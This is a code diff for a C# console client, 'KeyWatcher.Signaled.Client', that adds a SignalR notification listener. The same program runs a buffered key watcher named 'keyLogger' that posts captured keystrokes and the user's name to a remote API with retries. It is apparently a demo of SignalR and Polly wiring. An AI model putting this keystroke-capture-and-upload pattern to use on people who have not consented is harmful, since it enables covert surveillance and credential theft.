@@ -1,4 +1,5 @@
 ﻿using KeyWatcher.Messages;
+using Microsoft.AspNetCore.SignalR.Client;
 using Newtonsoft.Json;
 using Polly;
 using System;
@@ -17,7 +18,20 @@ namespace KeyWatcher.Signaled.Client
 
 		static async Task Main(string[] args)
 		{
-			await Console.Out.WriteLineAsync("Begin signaled client...");
+			await Console.Out.WriteLineAsync("Setting up SignalR client...");
+			var connection = new HubConnectionBuilder()
+				.WithUrl(Common.KeyWatcherHubApiUri)
+				.WithConsoleLogger()
+				.Build();
+
+			connection.On<NotificationMessage>(Common.NotificationSent, data =>
+			{
+				Console.WriteLine($"{Common.NotificationSent} received: {data.Message}");
+			});
+
+			await connection.StartAsync();
+
+			await Console.Out.WriteLineAsync("Setting up HTTP call policy...");
 			var userName = Common.GetUserName();
 			var client = new HttpClient();
 			var httpPolicy = Policy.Handle<HttpRequestException>(e =>
@@ -31,6 +45,7 @@ namespace KeyWatcher.Signaled.Client
 					return Program.Retry;
 				});
 
+			await Console.Out.WriteLineAsync("Setting up key watcher...");
 			var keyLogger = new BufferedEventedKeyWatcher(Program.BufferSize);
 			keyLogger.KeysLogged += async (s, e) =>
 			{
@@ -39,10 +54,11 @@ namespace KeyWatcher.Signaled.Client
 				var content = new StringContent(message,
 					Encoding.Unicode, "application/json");
 
-				await httpPolicy.ExecuteAsync(async () => await client.PostAsync(Common.ApiUri, content));
+				await httpPolicy.ExecuteAsync(async () => await client.PostAsync(Common.KeyWatcherApiUri, content));
 			};
 
 
+			await Console.Out.WriteLineAsync("Begin signaled client.");
 			keyLogger.Listen();
 		}
 	}
